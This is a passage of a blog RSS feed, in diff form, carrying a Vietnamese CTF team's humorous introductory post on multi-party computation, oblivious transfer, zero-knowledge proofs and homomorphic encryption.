@@ -1,0 +1,1285 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>chuymichxinhdep &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/author/chuymichxinhdep/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Thu, 08 Sep 2016 07:45:40 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>An toàn tính toán đa thành viên</title>
+		<link>https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/</link>
+				<pubDate>Wed, 07 Sep 2016 11:24:32 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[chuymich]]></category>
+		<category><![CDATA[crypto]]></category>
+		<category><![CDATA[research]]></category>
+		<category><![CDATA[vietnamese]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=557</guid>
+				<description><![CDATA[Multi-Party Computation (MPC) là một khái niệm được các nhà mật mã học đắn đo nghiên cứu tận những thập niên 80 thế kỷ trước. Xuất phát tự nhiên từ những bài toán học búa trong cuộc sống phải đặt ra một giao thức hay ho hơn để đánh đố nhau. Ví dụ năm 1982 đó &#8230; <a href="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/" class="more-link">Continue reading <span class="screen-reader-text">An toàn tính toán đa thành viên</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><strong>Multi-Party Computation (MPC)</strong> là một khái niệm được các nhà mật mã học đắn đo nghiên cứu tận những thập niên 80 thế kỷ trước. Xuất phát tự nhiên từ những bài toán học búa trong cuộc sống phải đặt ra một giao thức hay ho hơn để đánh đố nhau. Ví dụ năm 1982 đó là bài toán triệu phú của anh Yao (1982 <a title="Andrew Yao" href="https://en.wikipedia.org/wiki/Andrew_Yao">Andrew Yao</a>  1), diễn Nôm đơn giản là anh Bin có số A tiền, còn anh Job có số B tiền. Hai anh trong một cuộc nhậu lỡ thách nhau xem ai có nhiều tiền hơn ai <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>. Nhưng hai anh đều không muốn lộ ra tổng số tiền mình có cho nhau biết. Do đó mới nảy sinh bài toàn chứng minh bất đẳng thức A ≥ B mà không lộ thông tin nào của A và B cho bất cứ ai, kể cả 2 anh Bin và anh Jobs. Giải quyết xong bài toàn này đã mở ra một kỷ nguyên mới cho bảo mật thông tin đặc biệt là thương mai điện tử, data mining khi muốn so sánh các giá trị, tính toán cộng trừ nhân chia mà vẫn bảo vệ được thông tin mật như số tiền, tổng tiền trong tài khoản khách hàng, thông tin nhân khẩu học v.v.</p>
+<p><span id="more-557"></span></p>
+<p><strong>1. MPC</strong></p>
+<p>Tổng quát hóa bài toán của Yao đó là: giả sử có n thành viên  <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_80a9c7eae10390d097c7698419f4e3ac.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> bảo mật cho n giá trị tương ứng <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_391e71aa9bce9e9078443200ea5c76a5.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, và tất cả các thành viên thực hiện phép tính <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_a722b10a2cc25a31b0c1067d8a2854fc.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> sao cho các giá trị <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_391e71aa9bce9e9078443200ea5c76a5.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> được bảo mật hoàn toàn. Trong định nghĩa này, bài toán của Yao là trường hợp nhỏ với <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_c303081f7a16f603112b0375bdc84883.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> và phép tính <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_345e1346b4e1502a8d3742870700eb0a.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Ví dụ thứ hai đó là trò chơi tình yêu, như các bạn đọc biết <a href="http://ctf.yeuchimse.com">yeuchimse</a> là một thanh niên ủy mị ướt át, sến rện hay nghĩ lung tung. Sẻ đệ lần đầu tiên không dám tỏ tình vì sợ người ấy không thích mình thì thật là quê độ nên đã yêu cầu <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdep </a>thiết kế một giao thức sao cho:</p>
+<ul>
+<li><strong> Eligibility</strong>: được thổ lộ và chỉ thổ lộ môt lần.</li>
+<li><strong>Privacy</strong>: đảm bảo không lộ thông tin đã thổ lộ cho bất kỳ ai biết, cho dù đó là người ấy hay chính <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdep </a></li>
+<li><strong>Universal Verifiability</strong>: ai cũng có thể check được kết quả là 2 đứa nó có đến được với nhau hay không để đảm bảo tính công bằng của cuộc chơi tình ái.</li>
+<li><strong>Robustness</strong>: Mọi hành động gian trá ví dụ như thổ lộ có yêu sau đó lại thay đổi ý kiến là không yêu đều bị cấm.</li>
+</ul>
+<p>4 tiền đề trên các bạn đọc nào thông minh có thể áp dụng vào bầu cử điện tử, tuy nhiên giao thức <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdep </a>thiết kế dưới đây sau này được biết đến rộng rãi dưới cái tên  Five-Card Trick (Bert den Boer, Eurocrypt 1989) như sau:</p>
+<figure id="attachment_560" aria-describedby="caption-attachment-560" style="width: 524px" class="wp-caption aligncenter"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?ssl=1"><img data-attachment-id="560" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=524%2C297&amp;ssl=1" data-orig-size="524,297" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=300%2C170&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=524%2C297&amp;ssl=1" class="wp-image-560 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?resize=524%2C297&#038;ssl=1" alt="Five-Card Trick (Bert den Boer, Eurocrypt 1989)" width="524" height="297" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?w=524&amp;ssl=1 524w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?resize=300%2C170&amp;ssl=1 300w" sizes="(max-width: 524px) 100vw, 524px" data-recalc-dims="1" /></a><figcaption id="caption-attachment-560" class="wp-caption-text">Five-Card Trick (Bert den Boer, Eurocrypt 1989)</figcaption></figure>
+<p>Với 5 lá bài Át, mặc định một chiếc lá Át cơ đỏ đặt sẵn trên bàn. Với các câu trả lời giữa 2 người tham gia trò chơi là Yêu hoặc không Yêu tương ứng với 2 cách xếp bài Át cơ, Át bích. Sau khi đặt bài xuống bàn (có thể thay đổi chiều hàng 5 bài để không ai biết câu trả lời của mình ở bên nào) thì kết quả cả 2 người đều có cảm tình với nhau chỉ xảy ra khi có 3 quân Át cơ nằm cạnh nhau. Trường hợp kết quả 2 người không hợp nhau thì vẫn đảm bảo cô gái không biết được đối phương trả lời là Yêu hay không Yêu. (Thật là vi diệu phải không? <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img class="alignnone wp-image-565" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=25%2C25&#038;ssl=1" alt="boss" width="25" height="25" data-recalc-dims="1" /></a>)</p>
+<p>Để giải thích cách giải này, thực chất đó chính là bảng AND toán tử ở bảng này:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?ssl=1"><img data-attachment-id="561" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=330%2C80&amp;ssl=1" data-orig-size="330,80" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=300%2C73&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=330%2C80&amp;ssl=1" class="size-medium wp-image-561 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?resize=300%2C73&#038;ssl=1" alt="Untitled" width="300" height="73" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?resize=300%2C73&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?w=330&amp;ssl=1 330w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
+<p>Kết quả xy=1 thì rõ khi và chỉ khi x=1 và y=1. Còn với xy=0 thì ta chỉ kết luận có 1 trong x hoặc y trả lời 0 mà không thể khẳng định rõ ai trả lời 0 hay 1. Kết quả lần thực nghiệm protocol đó như các bạn đã biết, cuộc sống rất ồn ào, có những kẻ thất tình không biết trốn vào đâu để ngồi một mình và tìm sự tĩnh lặng cho riêng mình nên đành chơi CTF. “Em chưa lấy chồng là lỗi của anh!”. Với love game thì đen bạc còn đỏ tình nhưng <a href="http://ctf.yeuchimse.com">yeuchimse</a> đen thôi, đỏ vẫn vậy. <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?ssl=1"><img data-attachment-id="564" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beauty/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beauty" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-564" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?resize=26%2C26&#038;ssl=1" alt="beauty" width="26" height="26" data-recalc-dims="1" /></a></p>
+<p><strong>2. OT</strong></p>
+<p>Để hóc búa hơn, người ta đã phát minh ra giao thức rất hay ho đó là Chuyển giao không lộ thông tin ( Oblivious Transfer ) đơn giản thế này:  Anh Mao giữ 2 giá trị <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9865b118af4cfc107929ec116ab9eb80.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> là bít tức là chỉ có 0 hoặc 1, chị MaiAnh giữ một giá trị secret s, tất nhiên, cũng chỉ là bít 01. Chị chọn một số u ngẫu nhiên khá to trong tập nguyên <strong>Z</strong> và chị tính <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7cb433fd43ea022f61fa76e4d73a28d8.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> với <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7997a21e02329ca6c6bc77e68e43277e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Do <em>s</em> là bit nên lúc này chị có 2 giá trị <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_f6bf330e68e6b2523ee18338347b8e2a.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, chị gửi cả 2 giá trị này lại cho Mao với mục đích làm Mao không biết giá trị <em>u, s</em> là gì, kể cả giá trị <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b2f5ff47436671b6e533d8dc3614845d.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> ở đây là generator chung mà cả 2 đều biết, thì theo bạn <a href="https://en.wikipedia.org/wiki/ElGamal_encryption">ElGamal </a>đối với máy tính cổ lỗ của Mao là con MBP 15 inch đời giữa 2015, tới lúc bốc mộ cũng không giải ra được <em>u</em> (à mà với điều kiện là chị MaiAnh có <em>u</em> rất to nhé). Sau bước này thì Mao chọn 2 giá trị <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_53dd2b7a99cd54e0d6febbc311e5b554.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> cũng ngẫu nhiên trong tập nguyên để tính một phương trình phức tạp hơn đó là:</p>
+<p><span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ae26caf67145aba703126c109d33ea19.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
+<p>Rồi Mao chuyển lại cặp <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_dbdce35eb2f44b7d782b3408c9661212.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> để cho MaiAnh tính ra <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_d9094fb8cc52a45fb6338a51d0b15d53.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Như vậy, Mao không để lộ cả 2 giá trị <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9865b118af4cfc107929ec116ab9eb80.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, trong khi MaiAnh không để lộ <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_03c7c0ace395d80182db07ae2c30f034.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:2px;' class='tex' alt="" data-recalc-dims="1" /></span> mà vẫn lấy được <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_a727b3abb09c0ecf8898343a5bbeffb1.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> về. Mao cũng không biết được MaiAnh đã lấy số nào về mà chỉ biết MaiAnh đã lấy được 1 số. Tóm tắt lại trong hình như sau:</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?ssl=1"><img data-attachment-id="563" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=389%2C187&amp;ssl=1" data-orig-size="389,187" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=300%2C144&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=389%2C187&amp;ssl=1" class="aligncenter wp-image-563 size-full" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?resize=389%2C187&#038;ssl=1" alt="Untitled" width="389" height="187" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?w=389&amp;ssl=1 389w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?resize=300%2C144&amp;ssl=1 300w" sizes="(max-width: 389px) 100vw, 389px" data-recalc-dims="1" /></a></p>
+<p>Câu hỏi đặt ra OT sẽ được áp dụng như thế nào, ví dụ anh Mích đang làm hệ thống e-Health sức khỏe y tế điện tử. Vì anh là bên thứ 3 làm tin học nên tất nhiên anh không được ông quan thanh liêm nào cho tiếp cận vào hồ sơ y tế của bệnh nhân. Do đó anh quyết định ký hợp đồng với bệnh viện sử dụng OT để làm API truy cập thông tin. Lúc này anh làm demo nên cơ sở dữ liệu mới có thông tin HIV của 2 bệnh nhân lưu dưới dạng dương tính (1) và âm tính (0). Áp dụng OTP anh Mích đã có thể biết trạng thái HIV của 1 trong 2 bệnh nhân mà bệnh viên không biết anh đã query bệnh nhân nào.</p>
+<p><strong>3.ZKP</strong></p>
+<p>Bệnh cạnh việc dùng OT để chia sẻ không lộ thông tin, người ta còn nghĩ ra nhiều trò phức tạp khác dưới cái tên <strong>ZKP (Zero Knowledge Proof)</strong> điển hình là bài toán lên bar của chụy Mích được trình bày như sau: Trong một lần trên bar hơi muộn vào khoảng 2 giờ sáng thì các anh pokemon ập vào đòi kiểm tra hành chính với lý do trên 18 tuổi mới được ngồi bar hút thuốc bú diệu như một số hoa hậu nào đó. Vốn là một người tôn trọng quyền con người chụy không muốn ai phán xét vì hút thuốc lá là quyền tự do của mỗi người. Chụy chân thành chúc mừng bạn chụy nếu em bỏ được thuốc, còn không em cũng đừng buồn vì sau một thời gian nghỉ, điếu thuốc sắp tới em hút đảm bảo nó sẽ ngon không bút nào tả xiết. Ngoài ra lại vốn là một người tôn trọng quyền con người chụy cũng không muốn để lộ liễu ngày sinh nhật của mình giữa chốn đông người. Thay vì trình ID CMND hay bằng lái chụy đã show thẻ ngân hàng của mình để quẹt bill cho các anh xem. Với luật trên 18 tuổi mới được làm credit card nên mặc nhiên chụy đã chứng minh mình đã trên 18 tuổi mà không để lộ ngày sinh của mình <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?ssl=1"><img data-attachment-id="566" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/sexy_girl/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="sexy_girl" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-566" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?resize=25%2C25&#038;ssl=1" alt="sexy_girl" width="25" height="25" data-recalc-dims="1" /></a>.</p>
+<p>Một ví dụ ZKP thứ 2 đó là ví dụ hang động của AliBaBa:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?ssl=1"><img data-attachment-id="567" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" data-orig-size="277,187" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" class="size-full wp-image-567 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?resize=277%2C187&#038;ssl=1" alt="Untitled" width="277" height="187" data-recalc-dims="1" /></a></p>
+<p>Nhi tuyên bố rằng cô biết mật mã để mở cửa hang. Líp hỏi cô phải chứng minh tuyên bố của mình. Nhưng Nhi không thể nói mật khẩu cho Líp vì như vậy thật là lộ liễu <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?ssl=1"><img data-attachment-id="566" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/sexy_girl/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="sexy_girl" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-566" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?resize=25%2C25&#038;ssl=1" alt="sexy_girl" width="25" height="25" data-recalc-dims="1" /></a>. Do đó chụy Mích đã chỉ cho Nhi một cách như sau:</p>
+<ul>
+<li>Líp đứng quay mặt tụt quần ở một khoảng cách khá xa và chờ Nhi bước vào hang.<br />
+Sau đó, Líp đến cửa hang rõ ràng anh ta không biết Nhi đã đi sang bên nào.</li>
+<li>Líp tùy ý hét lên yêu cầu Nhi bước ra từ bên trái hoặc bên phải.</li>
+<li>Hai đứa lặp lại trò chơi này cho đến khi Líp bị thuyết phục hoặc Nhi chán không chơi nữa.</li>
+</ul>
+<p>Rõ ràng nếu Nhi đã ở phía bên trái và Líp yêu cầu cô ấy đến từ bên trái thì quả này Nhi đã may mắn <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=24%2C24&#038;ssl=1" alt="surrender" width="24" height="24" data-recalc-dims="1" /></a>. Nếu không, Nhi chỉ có thể đến từ bên trái nếu cô ấy biết mật mã để mở cửa hang phải không nào (!?).</p>
+<p><strong>4.Hệ mật đồng cấu( Homomorphic cryptosystem)</strong></p>
+<p>Để tiếp tục là cuộc chơi thêm phần phức tạp, các nhà mật mã học lại tiếp tục nghĩ ra Hệ mật đồng cấu được định nghĩa:</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?ssl=1"><img data-attachment-id="570" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=463%2C159&amp;ssl=1" data-orig-size="463,159" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=300%2C103&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=463%2C159&amp;ssl=1" class="aligncenter wp-image-570 size-full" 